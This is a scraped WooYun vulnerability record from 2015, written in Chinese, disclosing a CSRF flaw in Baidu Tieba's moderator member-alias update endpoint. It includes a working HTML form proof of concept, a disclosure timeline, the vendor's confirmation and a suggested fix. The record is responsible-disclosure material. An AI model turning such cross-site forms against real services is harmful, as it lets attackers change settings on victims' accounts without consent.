{"id": 32255, "wybug_id": "wooyun-2015-0111863", "wybug_title": "百度贴吧CSRF一枚（专门针对吧主权限的账户）", "wybug_corp": "百度", "wybug_author": "昌维", "wybug_date": "2015-05-04 10:34", "wybug_open_date": "2015-06-20 18:52", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "百度", "利用", "贴吧", "百度贴吧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向公众公开  简要描述： 百度贴吧发现一枚针对吧主权限的CSRF 详细说明：  首先打开一个我有吧主权限的贴吧，抓包查看修改会员名称的数据包如图\n\n然后发现是这样向http://tieba.baidu.com/f/bawu/commit/update_member_alias这个链接提交kw和mbr_alias参数，kw是贴吧名称，mbr_alias是要修改的会员名称\n\n并没有tbs，所以猜想在外域构造一个表单提交应该算可以csrf的，html代码为\n<form id=\"form1\" name=\"form1\" method=\"post\" action=\"http://tieba.baidu.com/f/bawu/commit/update_member_alias\">  <p>    贴吧名称kw：      <input type=\"text\" name=\"kw\" id=\"kw\" />  </p>  <p>    会员名称mbr_alias：      <input type=\"text\" name=\"mbr_alias\" id=\"mbr_alias\" />  </p>  <p>    <input type=\"submit\" value=\"csrf_go\" />   by 昌维</p></form>\n然后我在backtrack这个吧测试了一下。发现可以成功在外域通过表单提交修改。如图之前贴吧会员名称是BT\n\n现在填好表单\n\n然后提交，返回json数据，错误码为0，根据百度惯例，0都是成功。\n\n然后再来backtrack吧看一下果然被修改了\n\n   漏洞证明：  我在backtrack这个吧测试了一下。发现可以成功在外域通过表单提交修改。如图之前贴吧会员名称是BT\n\n现在填好表单\n\n然后提交，返回json数据，错误码为0，根据百度惯例，0都是成功。\n\n然后再来backtrack吧看一下果然被修改了\n\n   修复方案：  加入tbs，或者验证来源也可以。   版权声明：转载请注明来源 昌维@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-05-06 18:50 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-11 12:20 |    \t\tThe soul \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  我觉得不错 404    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}